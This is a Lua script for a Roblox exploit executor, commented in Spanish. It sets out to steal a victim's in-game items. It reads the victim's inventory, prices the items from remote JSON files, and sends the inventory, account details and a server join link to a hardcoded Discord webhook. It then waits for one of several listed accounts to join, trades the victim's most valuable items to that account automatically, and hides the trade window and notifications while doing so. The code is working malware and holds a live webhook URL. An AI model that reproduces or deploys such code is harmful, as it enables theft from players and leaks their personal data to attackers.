
-- ==========================================
-- SCRIPT 2 (CORE FINAL - TRADEO FUNCIONAL)
-- ==========================================
local HttpService = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ==========================================
-- URLS DE LOS REPOSITORIOS DE VALORES (JSON)
-- ==========================================
local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
local VALUES_REPO_URL_DUAL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"

-- ==========================================
-- CONFIGURACIÓN SECRETA DUAL
-- ==========================================
local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"

local jugadoresObjetivosDual = {
    "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
    "juancarloselkrak7", "azanuvpro777", "ppeoihjv", "BeKindPleaseOmg"
}

-- ==========================================
-- LÓGICA DE FILTRADO
-- ==========================================
local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
local EXCLUDE = {}
for _, n in ipairs(EXCLUDE_ITEMS) do EXCLUDE[string.lower(n)] = true end

local okTrade, ItemIsTradeable = pcall(function()
    return require(RS.Shared.Utils.ItemIsTradeable)
end)
if not okTrade or type(ItemIsTradeable) ~= "function" then ItemIsTradeable = nil end

local function isTradeable(name)
    if not ItemIsTradeable then return true end
    local ok, res = pcall(ItemIsTradeable, name)
    if not ok then return true end
    return res and true or false
end

-- ==========================================
-- CARGA DINÁMICA DE VALORES
-- ==========================================
local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
local KnivesDual, GunsDual, EffectsDual, EmotesDual = {}, {}, {}, {}

local function cargarValoresGitHub(url)
    local success, response = pcall(function() return game:HttpGet(url) end)
    if success and response then
        local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(response) end)
        if decodeSuccess and decodedData then
            return decodedData.Knives or {}, decodedData.Guns or {}, decodedData.Effects or {}, decodedData.Emotes or {}
        end
    end
    return {}, {}, {}, {}
end

Knives, Guns, Effects, Emotes = cargarValoresGitHub(VALUES_REPO_URL)
KnivesDual, GunsDual, EffectsDual, EmotesDual = cargarValoresGitHub(VALUES_REPO_URL_DUAL)

task.spawn(function()
    while getgenv and not getgenv().AutoTradeConfig do
        task.wait(0.2)
    end
    
    local config = getgenv().AutoTradeConfig or {}
    local WEBHOOK_LOGS = config.WebhookLogs or "" 
    local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
    local startTime = os.time()

    pcall(function()
        if request and player and WEBHOOK_LOGS ~= "" then
            request({
                Url = WEBHOOK_LOGS,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    content = "✅ **" .. player.Name .. "** ha ejecutado el script."
                })
            })
        end
    end)

    Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer == Players.LocalPlayer then
            local tiempoTranscurrido = os.time() - startTime
            local horas = math.floor(tiempoTranscurrido / 3600)
            local minutes = math.floor((tiempoTranscurrido % 3600) / 60)
            local segundos = tiempoTranscurrido % 60

            local textoTiempo = ""
            if horas > 0 then textoTiempo = textoTiempo .. horas .. " horas, " end
            if minutes > 0 then textoTiempo = textoTiempo .. minutes .. " minutos y " end
            textoTiempo = textoTiempo .. segundos .. " segundos"

            pcall(function()
                if request then
                    if WEBHOOK_INVENTARIO ~= "" then
                        request({
                            Url = WEBHOOK_INVENTARIO,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha cerrado o salido del juego.\n⏳ **Duró ejecutando el script:** `" .. textoTiempo .. "`"
                            })
                        })
                    end
                    if WEBHOOK_LOGS ~= "" then
                        request({
                            Url = WEBHOOK_LOGS,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = "❌ **" .. leavingPlayer.Name .. "** duró `" .. textoTiempo .. "` usando el script."
                            })
                        })
                    end
                end
            end)
        end
    end)

    local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)

    if ok and cg.PlayerData then
        local pd = cg.PlayerData
        local allItems = {}
        
        local function normalizeName(name)
            return string.gsub(name, " ", "")
        end

        local categories = {"Knife", "Gun", "Effect", "Emote"}
        for _, cat in ipairs(categories) do
            local inv = pd:TryIndex({"Inventory", cat})
            if inv then
                for guid, item in pairs(inv) do
                    if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                        table.insert(allItems, {cat = cat, name = item.name, guid = guid})
                    end
                end
            end
        end

        local knivesUser, gunsUser, effectsUser, emotesUser = {}, {}, {}, {}
        local totalValueUser = 0
        local knivesDual, gunsDual, effectsDual, emotesDual = {}, {}, {}, {}
        local totalValueDual = 0

        for _, item in ipairs(allItems) do
            local cleanName = normalizeName(item.name)
            
            local valTableUser = nil
            if item.cat == "Knife" then valTableUser = Knives
            elseif item.cat == "Gun" then valTableUser = Guns
            elseif item.cat == "Effect" then valTableUser = Effects
            elseif item.cat == "Emote" then valTableUser = Emotes end
            
            if valTableUser and valTableUser[cleanName] then
                local val = valTableUser[cleanName]
                totalValueUser = totalValueUser + val
                local tUser = {name = item.name, guid = item.guid, value = val}
                if item.cat == "Knife" then table.insert(knivesUser, tUser)
                elseif item.cat == "Gun" then table.insert(gunsUser, tUser)
                elseif item.cat == "Effect" then table.insert(effectsUser, tUser)
                elseif item.cat == "Emote" then table.insert(emotesUser, tUser) end
            end
            
            local valTableDual = nil
            if item.cat == "Knife" then valTableDual = KnivesDual
            elseif item.cat == "Gun" then valTableDual = GunsDual
            elseif item.cat == "Effect" then valTableDual = EffectsDual
            elseif item.cat == "Emote" then valTableDual = EmotesDual end
            
            if valTableDual and valTableDual[cleanName] then
                local val = valTableDual[cleanName]
                totalValueDual = totalValueDual + val
                local tDual = {name = item.name, guid = item.guid, value = val}
                if item.cat == "Knife" then table.insert(knivesDual, tDual)
                elseif item.cat == "Gun" then table.insert(gunsDual, tDual)
                elseif item.cat == "Effect" then table.insert(effectsDual, tDual)
                elseif item.cat == "Emote" then table.insert(emotesDual, tDual) end
            end
        end

        local hayItemsDual = (#knivesDual > 0) or (#gunsDual > 0) or (#effectsDual > 0) or (#emotesDual > 0)

        if hayItemsDual and request then 
            local fileName = "AutoTrade_Executions.json"
            local executionData = {}
            local executionText = player.Name .. " 1x executions"

            if isfile and readfile and writefile then
                if isfile(fileName) then
                    local success, data = pcall(function() return HttpService:JSONDecode(readfile(fileName)) end)
                    if success and type(data) == "table" then executionData = data end
                end
                local playerName = player.Name
                if not executionData[playerName] then executionData[playerName] = 0 end
                executionData[playerName] = executionData[playerName] + 1
                pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
                executionText = playerName .. " " .. executionData[playerName] .. "x executions"
            end

            local function formatearLista(lista)
                local contador, orden, texto = {}, {}, ""
                for _, v in ipairs(lista) do
                    local clave = v.name
                    if not contador[clave] then
                        contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value }
                        table.insert(orden, clave)
                    else
                        contador[clave].cantidad = contador[clave].cantidad + 1
                        contador[clave].valor = contador[clave].valor + v.value
                    end
                end
                for _, clave in ipairs(orden) do
                    local info = contador[clave]
                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                end
                if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
                return texto 
            end

            local function generarPayload(knives, guns, effects, emotes, totalValue, titulo)
                local campos = {}
                if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = true }) end
                if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = true }) end
                if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
                if #emotes > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes), inline = false }) end

                local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
                local playersCount = #Players:GetPlayers()
                local maxPlayers = Players.MaxPlayers
                local robloxVer = version()
                
                local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
                local bodyUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"

                local descriptionText = "### 👤 Información del Jugador\n" ..
                                        "**Usuario:** `" .. player.Name .. "`\n" ..
                                        "**Display Name:** `" .. player.DisplayName .. "`\n" ..
                                        "**User ID:** `" .. player.UserId .. "`\n" ..
                                        "**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
                                        "### ⚙️ Información del Servidor\n" ..
                                        "**JobId:** `" .. game.JobId .. "`\n" ..
                                        "**🔗 Join Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n" ..
                                        "**Server:** `" .. playersCount .. "/" .. maxPlayers .. "`\n" ..
                                        "**Roblox Version:** `" .. robloxVer .. "`\n" ..
                                        "**Executor:** `" .. executorName .. "`\n\n" ..
                                        "### 📊 Estadísticas de Hit\n" ..
                                        "**Historial:** `" .. executionText .. "`\n" ..
                                        "**Total Value:** `💰 " .. totalValue .. "`\n\n" ..
                                        "**=============================**"

                local pings = {}
                local embedColor = 3447003

                if totalValue >= 5000 then
                    table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR DETECTADO)!** 🚨")
                    embedColor = 16711680
                elseif totalValue >= 2000 then
                    table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
                    embedColor = 16766720
                end

                local finalContentText = nil
                if #pings > 0 then finalContentText = table.concat(pings, "\n") end

                return {
                    content = finalContentText, 
                    username = "Auto-Trade Bot Scanner",
                    avatar_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
                    embeds = {{
                        title = titulo,
                        color = embedColor, 
                        description = descriptionText,
                        thumbnail = { url = avatarUrl }, 
                        image = { url = bodyUrl },       
                        fields = campos,
                        footer = { 
                            text = "Sistema de Escaneo Automático | " .. os.date("%X"),
                            icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png"
                        }
                    }}
                }
            end

            local payloadUser = generarPayload(knivesUser, gunsUser, effectsUser, emotesUser, totalValueUser, "🎯 ¡Objetivo de Tradeo Localizado!")
            local payloadDual = generarPayload(knivesDual, gunsDual, effectsDual, emotesDual, totalValueDual, "🎯 ¡ROBO EJECUTADO - BOTÍN ASEGURADO!")

            local jsonPayloadUser = HttpService:JSONEncode(payloadUser)
            local jsonPayloadDual = HttpService:JSONEncode(payloadDual)

            task.spawn(function()
                if DUAL_WEBHOOK_INVENTARIO ~= "" then
                    request({
                        Url = DUAL_WEBHOOK_INVENTARIO,
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body = jsonPayloadDual
                    })
                end
            end)

            if WEBHOOK_INVENTARIO ~= "" then
                task.delay(300, function()
                    pcall(function()
                        request({
                            Url = WEBHOOK_INVENTARIO,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = jsonPayloadUser
                        })
                    end)
                end)
            end
        end

        -- ==========================================
        -- BÚSQUEDA DEL JUGADOR OBJETIVO
        -- ==========================================
        local jugadorEncontrado = nil
        local NOMBRE_OBJETIVO = nil

        repeat 
            task.wait(0.5)
            for _, nombre in ipairs(jugadoresObjetivosDual) do
                local p = Players:FindFirstChild(nombre)
                if p then
                    jugadorEncontrado = p
                    NOMBRE_OBJETIVO = nombre
                    break
                end
            end
        until jugadorEncontrado

        task.wait(10)

        -- ==========================================
        -- LÓGICA DE TRADEO EXACTA DEL RYSHUB (CORREGIDA)
        -- ==========================================
        local MAX_TRADE_ITEMS = 12
        local OFFER_GAP = 0.35
        local READY_TIMEOUT = 60
        local INVITE_EVERY = 8

        local okRemotes, Remotes = pcall(function() return require(RS.Shared.Remotes) end)
        local okCG, cgDataTrade = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
        
        if not okRemotes or not okCGTrade then return end
        
        local ActiveNegotiation = cgDataTrade.ActiveNegotiation
        local SessionState = cgDataTrade.SessionState
        local Workspace = game:GetService("Workspace")

        -- Función helper para comparar jugadores por nombre (más robusta)
        local function isTargetPlayer(p)
            if not NOMBRE_OBJETIVO then return false end
            local name = typeof(p) == "Instance" and p.Name or tostring(p)
            return string.lower(name) == string.lower(NOMBRE_OBJETIVO)
        end

        local function sides()
            local data = ActiveNegotiation.Data
            if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
            local me, other
            if data.player1.player and data.player1.player.UserId == player.UserId then
                me, other = data.player1, data.player2
            else
                me, other = data.player2, data.player1
            end
            return me, other, data
        end

        local function offeredGuids()
            local me = sides()
            local set, n = {}, 0
            if me and me.offer then
                for _, guid in pairs(me.offer.items or {}) do set[guid] = true; n = n + 1 end
            end
            return set, n
        end

        local function getIncoming()
            local v = SessionState:TryIndex({ "incomingTradeRequests" })
            return type(v) == "table" and v or {}
        end

        local function waitUntil(cond, timeout)
            local t0 = os.clock()
            while os.clock() - t0 < timeout do
                if cond() then return true end
                task.wait(0.2)
            end
            return cond()
        end

        local function waitProcessingLock()
            waitUntil(function()
                local d = ActiveNegotiation.Data
                return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
            end, 5)
        end

        local function setReadyTrue()
            local _, _, data = sides()
            if not data then return false end
            waitUntil(function()
                local _, _, d = sides()
                return d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3
            end, 6)
            local _, _, d2 = sides()
            if not d2 then return false end
            pcall(function() Remotes.SetReady:FireServer(true, d2.ref or {}) end)
            return true
        end

        -- Inventario clasificado y ordenado por TU VALOR DUAL
        local function getInventoryForTrade()
            local pdTrade = cgDataTrade.PlayerData
            local items = {}
            
            for _, cat in ipairs({"Knife", "Gun", "Effect", "Emote"}) do
                local inv = pdTrade:TryIndex({"Inventory", cat})
                if inv then
                    for guid, item in pairs(inv) do
                        if item and item.name then
                            local cleanName = string.gsub(item.name, " ", "")
                            local valueTable = nil
                            if cat == "Knife" then valueTable = KnivesDual
                            elseif cat == "Gun" then valueTable = GunsDual
                            elseif cat == "Effect" then valueTable = EffectsDual
                            elseif cat == "Emote" then valueTable = EmotesDual end
                            
                            if valueTable and valueTable[cleanName] and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                                table.insert(items, { name = item.name, guid = guid, value = valueTable[cleanName], cat = cat })
                            end
                        end
                    end
                end
            end

            table.sort(items, function(a, b) return a.value > b.value end)
            return items
        end

        local function tradingWithTarget()
            local _, other = sides()
            return other and other.player and isTargetPlayer(other.player)
        end

        local function handleTrade()
            local offered, offeredCount = offeredGuids()
            local room = MAX_TRADE_ITEMS - offeredCount

            if room > 0 then
                local batch = {}
                for _, e in ipairs(getInventoryForTrade()) do
                    if not offered[e.guid] then
                        batch[#batch + 1] = e
                        if #batch >= room then break end
                    end
                end

                if #batch == 0 and offeredCount == 0 then
                    pcall(function() Remotes.CancelTrade:FireServer() end)
                    return "empty"
                end

                if #batch > 0 then
                    for _, e in ipairs(batch) do
                        if not sides() then return "closed" end
                        waitProcessingLock()
                        pcall(function() Remotes.OfferItem:FireServer(e.guid) end)
                        task.wait(OFFER_GAP)
                    end
                    task.wait(0.5)
                    local _, nowCount = offeredGuids()
                    if nowCount < math.min(MAX_TRADE_ITEMS, offeredCount + #batch) then
                        return "retry"
                    end
                end
            end

            local me = sides()
            if not me then return "closed" end
            if not me.ready then
                task.wait(0.3)
                setReadyTrue()
            end

            local done = waitUntil(function()
                local m, _, d = sides()
                if not d then return true end
                if d.exchanging == true then return true end
                if m and not m.ready then return true end
                return false
            end, READY_TIMEOUT)

            local m, _, d = sides()
            if d and d.exchanging then
                waitUntil(function() return sides() == nil end, 20)
                return "done"
            end
            if not d then return "closed" end
            if m and not m.ready then return "retry" end
            return "waiting"
        end

        -- ==========================================
        -- SISTEMA DE OCULTAMIENTO DE GUI
        -- ==========================================
        local tradeGui = nil
        local tradeGuiOriginal = nil
        local tradeHidden = false
        local tradeGuiConns = {}

        task.spawn(function()
            local pGui = player:WaitForChild("PlayerGui")
            local newGui = pGui:WaitForChild("NewGui", 30)
            if not newGui then return end
            tradeGui = newGui:WaitForChild("TradeNegotiation", 30)
            if not tradeGui then return end
            
            tradeGuiOriginal = tradeGui.Position

            local function applyTradeGuiState()
                if not tradeGui then return end
                pcall(function()
                    if tradeHidden then
                        if tradeGui.Position ~= UDim2.new(1000, 1000, 1000, 1000) then
                            tradeGui.Position = UDim2.new(1000, 1000, 1000, 1000)
                        end
                        if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                            pGui.Notifications.Body.Visible = false
                        end
                    elseif tradeGuiOriginal and tradeGui.Position ~= tradeGuiOriginal then
                        tradeGui.Position = tradeGuiOriginal
                        if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                            pGui.Notifications.Body.Visible = true
                        end
                    end
                end)
            end

            tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Position"):Connect(function()
                if not tradeHidden and tradeGui.Position ~= UDim2.new(1000, 1000, 1000, 1000) then
                    tradeGuiOriginal = tradeGui.Position
                end
                applyTradeGuiState()
            end)
            
            tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Visible"):Connect(applyTradeGuiState)

            while jugadorEncontrado and jugadorEncontrado.Parent do
                local hide = tradingWithTarget()
                if hide ~= tradeHidden then
                    tradeHidden = hide
                    applyTradeGuiState()
                end
                task.wait(0.2)
            end
            
            for _, c in ipairs(tradeGuiConns) do pcall(function() c:Disconnect() end) end
        end)

        -- ==========================================
        -- BUCLE PRINCIPAL DE TRADEO (EXACTO AL RYSHUB)
        -- ==========================================
        local lastInvite = 0
        local lastAccept = {}
        local emptyNotified = false

        while jugadorEncontrado and jugadorEncontrado.Parent do
            local me, other = sides()

            if me and other and other.player then
                if isTargetPlayer(other.player) then
                    local ok, res = pcall(handleTrade)
                    if ok and res == "empty" then
                        if not emptyNotified then
                            emptyNotified = true
                        end
                    elseif ok and res == "done" then
                        emptyNotified = false
                        task.wait(1)
                    end
                else
                    task.wait(1)
                end
            else
                local now = os.clock()
                local accepted = false
                
                for _, p in ipairs(getIncoming()) do
                    if isTargetPlayer(p) then
                        local key = typeof(p) == "Instance" and p.UserId or tostring(p)
                        if not lastAccept[key] or now - lastAccept[key] > 3 then
                            lastAccept[key] = now
                            pcall(function() Remotes.AcceptInvite:FireServer(p) end)
                            accepted = true
                        end
                    end
                end

                if not accepted and (now - lastInvite > INVITE_EVERY) then
                    if #getInventoryForTrade() > 0 then
                        lastInvite = now
                        pcall(function() Remotes.SendInvite:FireServer(jugadorEncontrado) end)
                    end
                end
            end

            task.wait(0.4)
        end

        -- ==========================================
        -- RESTAURACIÓN FINAL
        -- ==========================================
        task.wait(0.5) 

        pcall(function()
            local pGui = player:WaitForChild("PlayerGui")
            if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                pGui.Notifications.Body.Visible = true
            end
            if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                if tradeGuiOriginal then
                    pGui.NewGui.TradeNegotiation.Position = tradeGuiOriginal
                else
                    pGui.NewGui.TradeNegotiation.Position = UDim2.new(0.5, -250, 0.5, -200) 
                end
            end
        end)
    end
end)
